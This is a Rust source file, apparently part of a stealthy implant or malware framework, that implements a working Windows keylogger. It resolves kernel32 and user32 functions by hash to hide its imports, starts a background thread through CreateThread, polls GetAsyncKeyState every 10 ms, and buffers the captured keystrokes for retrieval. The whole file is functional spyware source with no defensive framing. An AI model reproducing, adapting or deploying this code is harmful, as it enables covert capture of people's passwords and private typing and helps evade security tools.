use alloc::string::String;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};

pub struct Collection;

#[cfg(target_os = "windows")]
static mut KEY_BUFFER: alloc::vec::Vec<u8> = alloc::vec::Vec::new();
#[cfg(target_os = "windows")]
static mut KEYLOGGER_RUNNING: bool = false;

impl Collection {
    pub fn keylogger_poll(&self) -> String {
        #[cfg(target_os = "windows")]
        unsafe {
            if !KEYLOGGER_RUNNING {
                self.start_keylogger();
                KEYLOGGER_RUNNING = true;
            }
            
            let buffer = &mut *core::ptr::addr_of_mut!(KEY_BUFFER);
            let result = String::from_utf8_lossy(buffer).into_owned();
            buffer.clear();
            result
        }
        #[cfg(not(target_os = "windows"))]
        { String::from("Keylogging not supported on Linux") }
    }

    #[cfg(target_os = "windows")]
    unsafe fn start_keylogger(&self) {
        let kernel32 = hash_str(b"kernel32.dll");
        let create_thread = resolve_function(kernel32, hash_str(b"CreateThread"));
        
        if !create_thread.is_null() {
            type FnCreateThread = unsafe extern "system" fn(
                *mut core::ffi::c_void,
                usize,
                unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
                *mut core::ffi::c_void,
                u32,
                *mut u32
            ) -> *mut core::ffi::c_void;
            
            let create_thread_fn: FnCreateThread = core::mem::transmute(create_thread);
            create_thread_fn(core::ptr::null_mut(), 0, keylogger_thread, core::ptr::null_mut(), 0, core::ptr::null_mut());
        }
    }
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn keylogger_thread(_param: *mut core::ffi::c_void) -> u32 {
    let user32 = hash_str(b"user32.dll");
    let get_async_key_state = resolve_function(user32, hash_str(b"GetAsyncKeyState"));
    let kernel32 = hash_str(b"kernel32.dll");
    let sleep = resolve_function(kernel32, hash_str(b"Sleep"));
    
    if get_async_key_state.is_null() || sleep.is_null() { return 0; }
    
    type FnGetAsyncKeyState = unsafe extern "system" fn(i32) -> i16;
    type FnSleep = unsafe extern "system" fn(u32);
    
    let fn_get_state: FnGetAsyncKeyState = core::mem::transmute(get_async_key_state);
    let fn_sleep: FnSleep = core::mem::transmute(sleep);
    
    loop {
        let buffer = &mut *core::ptr::addr_of_mut!(KEY_BUFFER);
        for i in 8..255 { 
            let state = fn_get_state(i);
            if (state & 1) != 0 {
                // Key pressed
                // Note: vk_to_str allocates String. In thread this might be unsafe if allocator not thread safe?
                // MiniHeap likely has a lock or we hope no contention.
                // Actually, MiniHeap in utils/heap.rs usually uses a spinlock.
                // Assuming allocator is thread safe (GlobalAlloc).
                let key_str = vk_to_str(i as u32);
                buffer.extend_from_slice(key_str.as_bytes());
            }
        }
        fn_sleep(10);
    }
}

#[cfg(target_os = "windows")]
fn vk_to_str(vk: u32) -> String {
    match vk {
        0x08 => String::from("[BACKSPACE]"),
        0x09 => String::from("[TAB]"),
        0x0D => String::from("[ENTER]"),
        0x10 => String::from("[SHIFT]"),
        0x11 => String::from("[CTRL]"),
        0x12 => String::from("[ALT]"),
        0x14 => String::from("[CAPS]"),
        0x1B => String::from("[ESC]"),
        0x20 => String::from(" "),
        0x25 => String::from("[LEFT]"),
        0x26 => String::from("[UP]"),
        0x27 => String::from("[RIGHT]"),
        0x28 => String::from("[DOWN]"),
        0x2E => String::from("[DEL]"),
        // A-Z
        0x41..=0x5A => {
            let c = (vk as u8) as char;
            let mut s = String::new();
            s.push(c);
            s
        },
        // 0-9
        0x30..=0x39 => {
            let c = (vk as u8) as char;
            let mut s = String::new();
            s.push(c);
            s
        },
        _ => String::from("."),
    }
}
